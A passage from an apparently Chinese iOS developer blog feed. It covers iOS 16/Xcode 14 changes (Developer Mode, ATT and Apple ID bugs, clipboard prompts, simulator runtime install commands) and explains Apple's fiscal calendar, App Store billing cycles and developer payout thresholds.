beta Software Installation Guide - Support - Apple Developer</a></li></ul><h1 id="二、升级后注意事项"><a href="#二、升级后注意事项" class="headerlink" title="二、升级后注意事项"></a><strong>二、升级后注意事项</strong></h1><blockquote><p><strong>与我们游戏或开发有关的注意事项</strong></p></blockquote><h2 id="2-1-开发者模式"><a href="#2-1-开发者模式" class="headerlink" title="2.1 开发者模式"></a>2.1 开发者模式</h2><p>在 iOS16 以前，添加设备到证书的开发者app，默认是允许自由打开。</p><p>而在 iOS 16，增加了“<strong>开发者模式</strong>”，顾名思意，跟安卓一样，开启开发者模式，才能调试系统的一些能力。</p><p><img src="https://p1-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/05a3dad6e7424bbe8da831750df2a092~tplv-k3u1fbpfcp-watermark.image" alt="image.png"></p><p>打开“<strong>开发者模式</strong>”，在设置 -&gt; 隐私与安全性 -&gt; 开发者模式，默认是关闭状态。</p><p><img src="https://p1-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/ed5e4369b7f14b5cb268bc912478e637~tplv-k3u1fbpfcp-watermark.image" alt="image.png"></p><p>点击开启后，会弹窗，需要确认后，<strong>设备需要重启后才能生效！</strong></p><p><img src="https://p3-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/8416cd5e662044d99a7afd0578efdefe~tplv-k3u1fbpfcp-watermark.image" alt="image.png"></p><p>并且，设备重启后，系统还会弹窗2次确认，是否开启。并提示开启会“<code>your device security will be reduced.</code>”(降低系统的安全性)。</p><p><img src="https://p9-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/b1f4faa90ab74cb6ac6c7ba208a53222~tplv-k3u1fbpfcp-watermark.image" alt="image.png"></p><h3 id="企业证书"><a href="#企业证书" class="headerlink" title="企业证书"></a>企业证书</h3><p>目前测试，企业证书签名的 app，不受“<strong>开发者模式</strong>”影响，只需要单独信任证书即可打开。</p><p><img src="https://p1-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/e545c22ada374edd86efe209f6911123~tplv-k3u1fbpfcp-watermark.image" alt="image.png"></p><h3 id="TestFlight"><a href="#TestFlight" class="headerlink" title="TestFlight"></a>TestFlight</h3><p>目前“<strong>开发者模式</strong>” 影响  TestFlight 安装的包含，不开启 “开发者模式”，无法打开：</p><p><img src="https://p9-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/fe59be626568410086b87b3979bb392b~tplv-k3u1fbpfcp-watermark.image" alt="image.png"></p><p>目前苹果文档显示为已知问题，可能下一版本修正。</p><p><img src="https://p6-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/e804a86bb8b846698a1e7f3d2bf809ad~tplv-k3u1fbpfcp-watermark.image" alt="image.png"></p><blockquote><p><a href="https://developer.apple.com/documentation/ios-ipados-release-notes/ios-ipados-16-release-notes">iOS &amp; iPadOS 16 Beta Release Notes | Apple Developer Documentation</a></p></blockquote><p>因为 Xcode 文档指出，这项功能不会影响从 App Store 购买 app 或参加 TestFlight 团队等普通安装技术。相反，开发人员模式专注于在Xcode中执行Build和Run，或使用 <a href="https://support.apple.com/apple-configurator">Apple Configurator</a> 安装 <code>.ipa</code> 文件等场景。在这些情况下，设备会明确要求使用它的人确认他们是开发人员，并意识到安装开发签名软件的风险。</p><p>苹果表示，iOS 16 和 watchOS 9 中引入的开发者模式可保护人们免于在设备上无意中安装可能有害的软件，并减少了仅由开发者功能暴露的攻击载体。</p><blockquote><p>详细可以查看 Xcode 文档：<a href="https://developer.apple.com/documentation/xcode/enabling-developer-mode-on-a-device">Enabling Developer Mode on a device</a></p></blockquote><h2 id="2-2-ATT-弹窗（bug）"><a href="#2-2-ATT-弹窗（bug）" class="headerlink" title="2.2  ATT 弹窗（bug）"></a>2.2  ATT 弹窗（bug）</h2><blockquote><h3 id="App-Tracking-Transparency"><a href="#App-Tracking-Transparency" class="headerlink" title="App Tracking Transparency"></a>App Tracking Transparency</h3><p><strong>Known Issues</strong></p><p>The IDFA isn’t provided to apps even if the App Tracking Transparency status is Authorized. (93978371)</p></blockquote><p>即使允许了跟踪，也获取不到 IDFA。</p><h2 id="2-3-Apple-ID（bug）"><a href="#2-3-Apple-ID（bug）" class="headerlink" title="2.3 Apple ID（bug）"></a>2.3 Apple ID（bug）</h2><blockquote><h3 id="Apple-ID-Authentication"><a href="#Apple-ID-Authentication" class="headerlink" title="Apple ID Authentication"></a>Apple ID Authentication</h3><p><strong>Known Issues</strong></p><p>In certain cases, such as after unlocking a device from Lost Mode, an Apple ID authentication might be blocked and Apple ID services rendered nonfunctional. The user is redirected to Apple ID Settings to perform an authentication, but no authentication request is ever visible to the user. (93980441)</p><p><strong>Workaround</strong>: Rebooting the device allows the authentication to proceed.</p></blockquote><p>可能无法使用 Apple ID 认证，临时解决方法，重启设备。</p><h2 id="2-4-UIKit"><a href="#2-4-UIKit" class="headerlink" title="2.4 UIKit"></a>2.4 UIKit</h2><blockquote><p>Attempting to set an orientation on <a href="https://developer.apple.com/documentation/uikit/uidevice"><code>UIDevice</code></a> via <code>setValue:forKey:</code> isn’t supported and no longer works. (93367651)</p></blockquote><h3 id="旋转屏幕："><a href="#旋转屏幕：" class="headerlink" title="旋转屏幕："></a><strong>旋转屏幕：</strong></h3><p>不支持通过 setValue:forKey: 在UIDevice上设置方向，也不再有效。需要开发者检查是否有使用此方法，可能后续版本将不能使用。</p><h3 id="剪切版："><a href="#剪切版：" class="headerlink" title="剪切版："></a><strong>剪切版：</strong></h3><p>iOS 14 开始，app 读取剪贴板时，在 app 的顶部会显示一行提示内容：</p><p><img src="https://p9-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/934d253e20d542e09afd685597990e79~tplv-k3u1fbpfcp-watermark.image" alt="image.png"></p><p>在 iOS 16 开始，当 app 要读取剪贴板；会被明确询问用户是否要允许它。</p><p><img src="https://p9-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/22e70e693af34b46acffb8c1dac4d886~tplv-k3u1fbpfcp-watermark.image" alt="image.png"></p><p><strong>注：</strong> <code>目前没有永久授予或永久拒绝的配置</code>，是系统层控制，也不需要开发者声明。所以，<strong>每次 app 尝试读取您的剪贴板时，都会弹出一次这个弹窗！</strong></p><h1 id="三、更新参考"><a href="#三、更新参考" class="headerlink" title="三、更新参考"></a><strong>三、更新参考</strong></h1><h2 id="3-1-Xcode-变化"><a href="#3-1-Xcode-变化" class="headerlink" title="3.1 Xcode 变化"></a>3.1 Xcode 变化</h2><ul><li><p>安装包减少了30%，从 10GB 降到 7 GB，因为其它平台在打开时可选择在下载安装。<br>  <img src="https://p1-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/b4550336936e4b269c4173d719d333f3~tplv-k3u1fbpfcp-watermark.image" alt="image.png"></p><blockquote><p>因为为了最大限度地减少Xcode的下载大小，Xcode14 及更高版本不包括 watchOS 和 tvOS 的<em>模拟器运行时</em>。打开时可选择再下载安装。<br>  另外，可以在苹果开发者网站单独下载：<br>  <img src="https://p6-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/f684406533d74977b891235385c4bca2~tplv-k3u1fbpfcp-watermark.image" alt="image.png"><br>  然后通过命令行安装：</p>  <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">xcode-select -s ~/Downloads/Xcode-beta.app</span><br><span class="line">xcodebuild -runFirstLaunch</span><br><span class="line">xcrun simctl runtime add <span class="string">&quot;~/Downloads/watchOS 9 beta Simulator Runtime.dmg&quot;</span></span><br></pre></td></tr></table></figure><p>  详细可参考：<a href="https://developer.apple.com/documentation/xcode/installing-additional-simulator-runtimes">Installing and managing simulator runtimes</a></p></blockquote></li><li><p>编译更快，可以查看每个类的编译耗时。<br>  <img src="https://p9-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/1185fb96e3a1431eb774bfacffb97645~tplv-k3u1fbpfcp-watermark.image" alt="image.png"></p></li><li><p>跨平台设计，一套 app 图标自动适配 iOS，iPadOS，macOS,  tvOS 等。<strong>iOS 只需要一张 1024 px 图片即可。</strong><br>  <img src="https://p3-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/f8409e42b44b47f6b7afe97b05410f48~tplv-k3u1fbpfcp-watermark.image" alt="image.png"></p></li></ul><h2 id="3-2-更新功能参考"><a href="#3-2-更新功能参考" class="headerlink" title="3.2 更新功能参考"></a>3.2 更新功能参考</h2><ul><li><a href="https://developer.apple.com/xcode/">Xcode 14 Overview - Apple Developer</a></li><li><a href="https://developer.apple.com/whats-new/">What’s new for Apple developers - Apple Developer</a></li><li><a href="https://developer.apple.com/app-store/whats-new/">What’s New - App Store - Apple Developer</a></li><li><a href="https://developer.apple.com/passkeys/">Passkeys Overview - Apple Developer</a></li><li><a href="https://developer.apple.com/documentation/xcode">Xcode | Apple Developer Documentation</a></li></ul><h1 id="四、总结"><a href="#四、总结" class="headerlink" title="四、总结"></a><strong>四、总结</strong></h1><p>以上就是我们升级 iOS 16 后，了解到的重点关注的内容更新，大家如果有更多发现，欢迎评论区一起分享~</p><blockquote><p>欢迎关注我们，了解更多 iOS 和 Apple 的动态~</p></blockquote>]]></content>
    
    
    <summary type="html">&lt;blockquote&gt;
&lt;p&gt;本文首发于 &lt;a href=&quot;https://juejin.cn/post/7107904852243513375&quot;&gt;WWDC22 开发者需要关注的重点内容 - 掘金&lt;/a&gt;，欢迎关注我们 &lt;a href=&quot;https://juejin.cn/user/1002387318511214&quot;&gt;@37手游iOS技术运营团队&lt;/a&gt; 。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;作者：iHTCboy&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;iOS 16 系统新特性，WWDC22 开发者，需要关注的重点内容、注意事项等，快速了解最新内容和需要适配的最新情况。&lt;/p&gt;
&lt;/blockquote&gt;</summary>
    
    
    
    <category term="technology" scheme="https://ihtcboy.com/categories/technology/"/>
    
    
    <category term="WWDC22" scheme="https://ihtcboy.com/tags/WWDC22/"/>
    
    <category term="iOS 16" scheme="https://ihtcboy.com/tags/iOS-16/"/>
    
    <category term="Xcode 14" scheme="https://ihtcboy.com/tags/Xcode-14/"/>
    
  </entry>
  
  <entry>
    <title>苹果 AppStore 财年和账单那些趣事</title>
    <link href="https://ihtcboy.com/2022/05/13/2022-05-13_%E8%8B%B9%E6%9E%9CAppStore%E8%B4%A6%E5%8D%95%E9%82%A3%E4%BA%9B%E8%B6%A3%E4%BA%8B/"/>
    <id>https://ihtcboy.com/2022/05/13/2022-05-13_%E8%8B%B9%E6%9E%9CAppStore%E8%B4%A6%E5%8D%95%E9%82%A3%E4%BA%9B%E8%B6%A3%E4%BA%8B/</id>
    <published>2022-05-13T07:58:10.000Z</published>
    <updated>2022-12-31T15:12:06.609Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>本文首发于 <a href="https://juejin.cn/post/7097126999827628063">苹果 AppStore 财年和账单那些趣事 - 掘金</a>，欢迎关注我们 <a href="https://juejin.cn/user/1002387318511214">@37手游iOS技术运营团队</a> 。</p></blockquote><p>作者：iHTCboy</p><blockquote><p>本文带你了解苹果 AppStore 的财年和账单周期，关于 AppStore 开发者账单和收入，相信很多开发者不一定有接触，或者接触时还是有很多疑问没有时间来学习。另外，还会有一些财年的诡计问题，比如为什么阿里巴巴财年是从4月1号到次年的3月31号呢？苹果财年为什么这么奇怪，本文一一为你解答~</p></blockquote><span id="more"></span><p><img src="https://ihtcboy.com/images/2022-AppStore-Financial-00.png" alt="AppStore-Financial-00"></p><h2 id="一、前言"><a href="#一、前言" class="headerlink" title="一、前言"></a>一、前言</h2><p>在苹果网站 <a href="https://www.apple.com.cn/newsroom/topics/company-news/">公司新闻</a> 页面会通告每个季度业绩：</p><p><img src="https://ihtcboy.com/images/2022-AppStore-Financial-01.png" alt="AppStore-Financial-01"></p><p>如果你有思考或好奇心，一定会有疑问：苹果的季度业绩为什么时间这个早？2022 年 1 月 27 日（北京时间）竟然公告的是 2022年Q1的业绩？？？跟我们平常理解的自然年的季度划分不一样，比如我们通常认为，2022年 Q1 会是 2022年1、2、3月。</p><p>所以，为什么会出现这样问题呢？这就是我们本文要介绍的其中一个关键点。</p><h2 id="二、Apple-账单"><a href="#二、Apple-账单" class="headerlink" title="二、Apple 账单"></a>二、Apple 账单</h2><h3 id="2-1-Apple-财年（会计财务年度）"><a href="#2-1-Apple-财年（会计财务年度）" class="headerlink" title="2.1 Apple 财年（会计财务年度）"></a>2.1 Apple 财年（会计财务年度）</h3><p><strong>财年</strong>（Fiscal Year，财经年度，财政年度，会计财务年度，会计年度），是指<strong>公司</strong>或<strong>国家</strong>每年制定<code>预算</code>或计算<code>收入</code>的统计时间。财季是指某一季度的财务状况，财年是指某一完整四个财季的财务状况。但每个国家或其法例所辖的组织各有不同，大抵分成两类：</p><ul><li>历年制</li><li>跨年制</li></ul><table><thead><tr><th>财年类型</th><th align="left">定义</th><th>采用的国家或地区</th></tr></thead><tbody><tr><td>历年度制</td><td align="left">指财政年度的起止期与年历始末相同，即公历1月1日起至12月31日止。</td><td>中国、德国、法国、波兰、匈牙利、朝鲜、南斯拉夫等</td></tr><tr><td>跨年度制</td><td align="left">指财政年度起止期与年历始末不相同。</td><td>英国、奥地利、日本、加拿大、印度等国家和地区是自4月1日起至次年3月31日止。<br> 瑞典、埃及、澳大利亚、巴基斯坦、孟加拉国、苏丹等国家是自7月1日起至次年6月30日止。<br> 美国在1976年以前是自7月1日起至次年6月30日止, 1976年以后改为自10月1日起至次年9月30日止。</td></tr></tbody></table><p>参考维基百科 <a href="https://zh.wikipedia.org/wiki/%E8%B2%A1%E6%94%BF%E5%B9%B4%E5%BA%A6">财政年度</a>，各国/地区的财政年度列表：</p><p><img src="https://ihtcboy.com/images/2022-AppStore-Financial-02.png" alt="AppStore-Financial-02"></p><p>从图中可以看到，美国政府的财年是从10月1日起至次年9月30日止。</p><blockquote><p>有一个约定俗成的问题，对于财务年度不在12月结束的公司，其财务报表会将结束日期所在的自然年称为其财务年度。<a href="https://www.zhihu.com/question/34512562/answer/142704768">来源</a></p></blockquote><p>例如 Alibaba 在 3 月 31 日为其 fiscal year end，那就会写 fiscal year ended on March 31rd, 2015 = Fiscal2015。</p><p><strong>那么为什么阿里巴巴财年是从 4 月 1 号到次年的 3 月 31 号呢？</strong></p><p>阿里巴巴于2014年在美国上市，但并没有按美国的习惯来发年报，其原因是为了配合最大股东软银 softbank 并表需要。因为日本软银财年截止时间是 3 月 31 日。（可以看上图，日本的财年周期时间）</p><p>所以，到这里大家对于财年就有了大概的了解，虽然美国政府的财年在1976年以后改为自10月1日起至次年9月30日止。但美国的企业并不都是按照这个月份来定，比如苹果是 Sep28 End（9月28日，但并不是固定，下文会解析）, 沃尔玛是 Jan31 End（1月31日）。</p><h3 id="2-2-AppStore-账单日历"><a href="#2-2-AppStore-账单日历" class="headerlink" title="2.2 AppStore 账单日历"></a>2.2 AppStore 账单日历</h3><p>所以，AppStore 账单也是按照苹果财年来定的，可以通过以下链接获取 AppStore 账单日历（注：<code>需要苹果开发者账号登陆才能访问</code>）： </p><ul><li><a href="https://itunesconnect.apple.com/WebObjects/iTunesConnect.woa/wa/jumpTo?page=fiscalcalendar">https://itunesconnect.apple.com/WebObjects/iTunesConnect.woa/wa/jumpTo?page=fiscalcalendar</a></li></ul><p><img src="https://ihtcboy.com/images/2022-AppStore-Financial-03.png" alt="AppStore-Financial-03"></p><blockquote><p>注：也可以在 <a href="https://appstoreconnect.apple.com/">App Store Connect</a> 后台找到入口：付款和财务报告 -&gt; 选中日期 -&gt; 最下方有一个 “查看财务日历” 入口。</p></blockquote><p>问题又来了！<strong>这个图怎么看？</strong></p><h3 id="2-3-AppStore-账单周期的规则"><a href="#2-3-AppStore-账单周期的规则" class="headerlink" title="2.3 AppStore 账单周期的规则"></a>2.3 AppStore 账单周期的规则</h3><p>苹果账单周期的规则，有2条大的规律：</p><ol><li>Apple 财年由四个财季组成（第一季度、第二季度、第三季度和第四季度），每个季度分别为 <code>35</code> 天，两个 <code>28</code> 天月。</li><li>苹果的财政年度从10月的财政年度开始：这意味着苹果的 2022 财年从 2021 年 10 月的第一季度开始。</li></ol><p>我们以 2022 年苹果财年来例，如下图所示：<br><img src="https://ihtcboy.com/images/2022-AppStore-Financial-04.png" alt="AppStore-Financial-04"></p><p>苹果 2022 年财年，以 Q1 为例：</p><ul><li>Q1：从 2021 年 9 月 26 日 ~  2021 年 12 月 25 日</li></ul><p>而每个月的账单月，也并不是自然月，Q1 季度的3个账单月：</p><ul><li>M1：9 月 26 日 ~ 10 月 30 日（共 35 天）</li><li>M2：10 月 31 日 ~ 11 月 27 日（共 28 天）</li><li>M3：11 月 28 日 ~ 12 月 25 日（共 28 天）</li></ul><p>同理，其它季度的也一样，这里就不展开了，大家可以在看看上图消化理解一下，其实并不难懂哈~ </p><p><code>如果觉得文章不错，可以顺手给个点赞哈~</code></p><p>当然，<strong>苹果账号的规律</strong> 还有很多细节：</p><ol start="3"><li>第一季度从 9 月底开始，每个账单月从周日开始，到周六结束。</li><li>苹果通常在账单月结束后 33 天内付款，40 天内开发者银行收到款项（如收不到，联系苹果）。</li><li>所以苹果财务日历只有 364 天，而正常年有 365 和 366 日，所以，<code>苹果每 5 年必须在 12 月的账单月增加一周</code>。</li></ol><h3 id="2-4-AppStore-账单周期的-“陷阱”"><a href="#2-4-AppStore-账单周期的-“陷阱”" class="headerlink" title="2.4 AppStore 账单周期的 “陷阱”"></a>2.4 AppStore 账单周期的 “陷阱”</h3><p>小编这里收集整理了苹果财务日历：2009年~2022年：</p><p> <img src="https://ihtcboy.com/images/2022-AppStore-Financial-05.png" alt="AppStore-Financial-05"></p><p>根据上文 2.3 最后一点提到：苹果财务日历只有364天，而正常年有365和366日，所以，苹果每5年必须在12月的账单月增加一周。</p><p>2017年周期增加了一周：<br><img src="https://ihtcboy.com/images/2022-AppStore-Financial-06.png" alt="AppStore-Financial-06"></p><p>所以，计算一下 2017 +5 年 = 2022 年，但 2022 年财年如上文提到，22Q1并没有增加多一周，估计2023年增加？</p><p><strong>大家可能不理解，这一周的增加意味着什么？</strong></p><p><a href="https://twitter.com/drbarnard/status/1486372839154409477">@David Barnard</a> 在推特上写道：</p><blockquote><p>With Apple likely grossing &gt;$1B/day, that’s &gt;$7B shifted from Q1 2022 to Q1 2023. Analysts do take note of this extra week and how it impacts revenue, but I’ve never seen a chart that tried to correct for it, so all the charts just make it look like an especially good quarter.</p><p>由于 Apple 可能每天收入 &gt;1B 美元(十亿)，即 &gt;7B 美元(七十亿)从 2022 年第一季度转移到 2023 年第一季度。分析师确实注意到这额外的一周以及它如何影响收入，但我从未见过图表试图纠正它，所以所有的图表都让它看起来像是一个特别好的季度。</p></blockquote><p>事实上，一个组织能够采取的任何一个会计年度连续12个月内组成。这一规则的一个可接受的变化是采用了52个星期的年度报告的时期。而苹果公司，会根据本身的在一年内销量很大的季节变化往往选择自己利于自己的财年，这对于开发者来说可能是一个 “陷阱”，也是一个 trick！</p><h3 id="2-5-AppStore-账单流程"><a href="#2-5-AppStore-账单流程" class="headerlink" title="2.5 AppStore 账单流程"></a>2.5 AppStore 账单流程</h3><p>综上，所以苹果的账单周期大概是这样的流程：</p><p><img src="https://ihtcboy.com/images/2022-AppStore-Financial-07.png" alt="AppStore-Financial-07"></p><blockquote><p>这个流程图有很多细节内容，这里就不展开了，大家有问题，可以在评估区交流啊~</p></blockquote><h2 id="三、开发者分成和收款"><a href="#三、开发者分成和收款" class="headerlink" title="三、开发者分成和收款"></a>三、开发者分成和收款</h2><h3 id="3-1-App-Store-大陆开发者收款的一些小细节"><a href="#3-1-App-Store-大陆开发者收款的一些小细节" class="headerlink" title="3.1 App Store 大陆开发者收款的一些小细节"></a>3.1 App Store 大陆开发者收款的一些小细节</h3><ol><li>App Store Connect 给中国大陆开发者的起付金额为$150及等额值，对应人民币约 1000 左右，如果当前收益不足，则会余额结转到下个月。</li><li>App Store Connect 会在本月计算上月的收益，并生成相应的付款和财务报告，这个时间一般在 5-15 日之间。满足了最低起付额之后，会生成一个预计打款时间，这个打款时间为下个月。也就是说，10 月份的收益，实际打款日期会在 12 月上旬(这里不得不说苹果有点坑。Google Play是11月15日左右就会给开发者打款了，要比 Google Play 打款时间慢很多）。另外在生成财务报告的时候，可能会短暂地出现余额结转的情况，这种情况是正常的，只需要耐心等待即可。（下个月才打款，不耐心也没有用）</li><li>即使开发者货币选为 CNY（人民币），苹果在实际打款的时候还是会以美元现汇的方式打款，不会使用人民币来汇款。所以大陆的开发者可以把这个设置为 USD，这样可以避免汇率波动造成的收益波动。</li><li>苹果从境外汇款的时候没有电汇费用，收到的美金金额和财务报告中的金额是一致的。</li></ol><blockquote><p>引用来源：<a href="https://zhuanlan.zhihu.com/p/31728097">App Store大陆开发者收款总结</a></p></blockquote><h3 id="3-2-公司的苹果财务报表和苹果后台实际看到的预付款相差大？"><a href="#3-2-公司的苹果财务报表和苹果后台实际看到的预付款相差大？" class="headerlink" title="3.2 公司的苹果财务报表和苹果后台实际看到的预付款相差大？"></a>3.2 公司的苹果财务报表和苹果后台实际看到的预付款相差大？</h3><p>这个问题在上文 “2.5 AppStore 账单” 流程图可以看出，每个环节都会有影响：</p><ol><li>时区差问题</li><li>用户退款问题</li><li>账务账单月不是按自然月</li><li>汇率差问题</li><li>苹果30%/15%分成问题</li><li>税费问题</li></ol><p>关于这个问题，最近发现还有一个原因，苹果账单报告数据里，有 2 个字段：</p><ul><li>Transaction Date（交易日期）</li><li>Settlement Date（结算日期）</li></ul><table><thead><tr><th>字段名称</th><th>日期类型</th><th>备注</th></tr></thead><tbody><tr><td>交易日期</td><td>交易日期</td><td>顾客购买 App 或 App 内购买项目的日期。仅当交易日期距离结算日期不超过 30 天时，才显示交易日期，否则该字段为空。</td></tr><tr><td>结算日期</td><td>MM／DD／YYYY</td><td>处理和收取顾客付款并开具发票的日期。</td></tr></tbody></table><ul><li>参考：<a href="https://help.apple.com/app-store-connect/?lang=zh-cn#/devfa880063b">财务报告字段</a></li></ul><p>苹果出账单的报告，是按结算日期来出账单。开发者的订单日期与苹果账单的交易日期一致，但因苹果账单月不是自然月，并且账单是以结算日期为准，导致数据对不上的问题。</p><h3 id="3-3-苹果内购收入最低打款门槛是多少？"><a href="#3-3-苹果内购收入最低打款门槛是多少？" class="headerlink" title="3.3 苹果内购收入最低打款门槛是多少？"></a>3.3 苹果内购收入最低打款门槛是多少？</h3><p><code>中国内地目前最低付款门槛为 150 美元</code>，也就是大概超过 1000 CNY（人民币）时会收到苹果打款。</p><p>如果您的银行所在国家或地区、银行帐户货币列于下表中，则您获得付款的最低门槛为 0.02 美元。</p><table><thead><tr><th>银行所在地区代码</th><th>银行所在地区</th><th>银行帐户货币</th><th>银行所在地区代码</th><th>银行所在地区</th><th>银行帐户货币</th></tr></thead><tbody><tr><td>AD</td><td>安道尔</td><td>EUR</td><td>IS</td><td>冰岛</td><td>EUR</td></tr><tr><td>AN</td><td>荷兰</td><td>EUR</td><td>IT</td><td>意大利</td><td>EUR</td></tr><tr><td>AT</td><td>奥地利</td><td>EUR</td><td>JP</td><td>日本</td><td>JPY</td></tr><tr><td>AU</td><td>澳大利亚</td><td>AUD</td><td>LI</td><td>列支敦士登</td><td>EUR</td></tr><tr><td>AZ</td><td>阿塞拜疆</td><td>EUR</td><td>LT</td><td>立陶宛</td><td>EUR</td></tr><tr><td>BE</td><td>比利时</td><td>EUR</td><td>LU</td><td>卢森堡</td><td>EUR</td></tr><tr><td>BR</td><td>巴西</td><td>BRL</td><td>MC</td><td>摩纳哥</td><td>EUR</td></tr><tr><td>BG</td><td>保加利亚</td><td>EUR</td><td>ME</td><td>黑山共和国</td><td>EUR</td></tr><tr><td>CA</td><td>加拿大</td><td>CAD</td><td>MM</td><td>缅甸</td><td>EUR</td></tr><tr><td>CC</td><td>科克斯（基灵）群岛</td><td>EUR</td><td>MQ</td><td>马提尼克岛</td><td>EUR</td></tr><tr><td>CH</td><td>瑞士</td><td>CHF</td><td>MT</td><td>马耳他</td><td>EUR</td></tr><tr><td>CH</td><td>瑞士</td><td>EUR</td><td>MY</td><td>马来西亚</td><td>MYR</td></tr><tr><td>CY</td><td>塞浦路斯共和国</td><td>EUR</td><td>NL</td><td>荷兰</td><td>EUR</td></tr><tr><td>CZ</td><td>捷克共和国</td><td>EUR</td><td>NO</td><td>挪威</td><td>EUR</td></tr><tr><td>DE</td><td>德国</td><td>EUR</td><td>NZ</td><td>新西兰</td><td>NZD</td></tr><tr><td>DK</td><td>丹麦</td><td>EUR</td><td>PH</td><td>菲律宾</td><td>PHP</td></tr><tr><td>EE</td><td>爱沙尼亚</td><td>EUR</td><td>PL</td><td>波兰</td><td>EUR</td></tr><tr><td>ES</td><td>西班牙</td><td>EUR</td><td>PM</td><td>圣皮埃尔和密克隆群岛</td><td>EUR</td></tr><tr><td>FI</td><td>芬兰</td><td>EUR</td><td>PT</td><td>葡萄牙</td><td>EUR</td></tr><tr><td>FR</td><td>法国</td><td>EUR</td><td>RE</td><td>留尼汪岛</td><td>EUR</td></tr><tr><td>GB</td><td>英国</td><td>EUR</td><td>RO</td><td>罗马尼亚</td><td>EUR</td></tr><tr><td>GB</td><td>英国</td><td>GBP</td><td>SE</td><td>瑞典</td><td>EUR</td></tr><tr><td>GF</td><td>法属圭亚那</td><td>EUR</td><td>SG</td><td>新加坡</td><td>SGD</td></tr><tr><td>GP</td><td>瓜德罗普岛</td><td>EUR</td><td>SI</td><td>斯洛文尼亚</td><td>EUR</td></tr><tr><td>GR</td><td>希腊</td><td>EUR</td><td>SK</td><td>斯洛伐克共和国</td><td>EUR</td></tr><tr><td>HK</td><td>香港</td><td>HKD</td><td>SM</td><td>圣马力诺</td><td>EUR</td></tr><tr><td>HU</td><td>匈牙利</td><td>EUR</td><td>US</td><td>美国</td><td>USD</td></tr><tr><td>ID</td><td>印度尼西亚</td><td>IDR</td><td>VA</td><td>罗马教廷（梵蒂冈城）</td><td>EUR</td></tr><tr><td>IE</td><td>爱尔兰</td><td>EUR</td><td>YT</td><td>马约特岛</td><td>EUR</td></tr></tbody></table><p>印度（INR）银行帐户的最低付款门槛为 0.30 美元。对于其他未提及的国家或地区、银行帐户货币，最低付款门槛为 150 美元。</p><p>另请注意，韩国（KRW）和泰国（THB）银行帐户的最低付款门槛如下：</p><ul><li><p><strong>韩国（KRW）</strong>：根据当地规定和银行要求，最低付款门槛为 50 美元。</p></li><li><p><strong>泰国（THB）</strong>：泰国居民的最低付款门槛为 10 美元；位于泰国境外的开发者最低付款门槛为 150 美元，付款方式仍为电汇付款。</p></li><li><p>参考：<a href="https://help.apple.com/app-store-connect/#/dev3d7556467">最低付款门槛</a></p></li></ul><h3 id="3-4-苹果内购收入到账怎么收款？"><a href="#3-4-苹果内购收入到账怎么收款？" class="headerlink" title="3.4 苹果内购收入到账怎么收款？"></a>3.4 苹果内购收入到账怎么收款？</h3><p>对于开发者来说，苹果付款到账后，并不是直接打开你的银行卡余额中，而是美元，所以需要<code>结汇</code>。关于结汇，可以在手机银行 app 输，但可能第一次需要到银行柜台办理，具体可以联系你在苹果后台填写的银行卡所属银行咨询。</p><p>最后，苹果在中国大陆的内购商品销售并未扣税，所以结汇资金属性，按理是需要报个人所得税。具体，可与当前税务局咨询。</p><h2 id="四、总结"><a href="#四、总结" class="headerlink" title="四、总结"></a>四、总结</h2><p>深入的财务报表和账单流程有非常专业和非常多的细节，这里就不展开了，因为小编可能也不懂！本文从一个财务报表的疑问开始，希望开发者，平时在做写代码的同时，对于可能与自己有关，又可能跟自己没有关的问题，可以多一个好奇心，多一个疑问，可能就多一份收获。</p><p><code>如果你觉得文章写的不错，欢迎点赞~ 欢迎评论区一起交流~</code></p><p>另外，WWDC 2022 将于北京时间 6 月 7 号开始，一般苹果会灰度上线一些新特性或功能，所以最近这些更新有可能会影响到生产环境，<strong>比如这2天的上传App 和 ASC 后台登陆就受到影响，服务出现了宕机无法使用的情况：</strong></p><p><img src="https://ihtcboy.com/images/2022-AppStore-Financial-08.png" alt="AppStore-Financial-08"></p><ul><li><a href="https://developer.apple.com/system-status/">System Status</a></li></ul><p>开发者们<strong>需要注意</strong>：最近 App 要多预留几天时间排期规划哈~</p><p>最后，我们团队接下来会持续关于 WWDC 22，给大家带来最新的动态，欢迎关注我们，回家不迷路哈~</p><blockquote><p>欢迎关注我们，了解更多 iOS 和 Apple 的动态~</p></blockquote><h3 id="五、参考"><a href="#五、参考" class="headerlink" title="五、参考"></a>五、参考</h3><ul><li><a href="https://www.apple.com.cn/newsroom/topics/company-news/">苹果公司新闻 - Company News - Newsroom - Apple</a></li><li><a href="https://www.apple.com/investor/earnings-call/">Apple Earnings Call - Apple</a></li><li><a href="https://investor.apple.com/investor-relations/default.aspx">Investor Relations - Apple</a></li><li><a href="https://zh.wikipedia.org/wiki/%E8%B2%A1%E6%94%BF%E5%B9%B4%E5%BA%A6">财政年度 - 维基百科</a></li><li><a href="https://baike.baidu.com/item/%E8%B4%A2%E5%B9%B4">财年_百度百科</a></li><li><a href="https://appstoreconnect.apple.com/">App Store Connect</a></li><li><a href="https://www.zhihu.com/question/34512562">为什么阿里巴巴的财年比自然年提前那么多？究竟有何缘故？ - 知乎</a></li><li><a href="https://www.revenuecat.com/blog/app-store-fiscal-calendar-and-payment-dates-2020/">Apple’s 2020 Fiscal Calendar and Payment Dates – RevenueCat</a></li><li><a href="https://www.revenuecat.com/blog/apple-fiscal-calendar-2021/">Apple’s Fiscal Calendar and Payout Dates 2021 – RevenueCat</a></li><li><a href="https://www.jianshu.com/p/a144fc9aa7e5">iOS内购-一次性解决财务的各种问题篇 - 简书</a></li><li><a 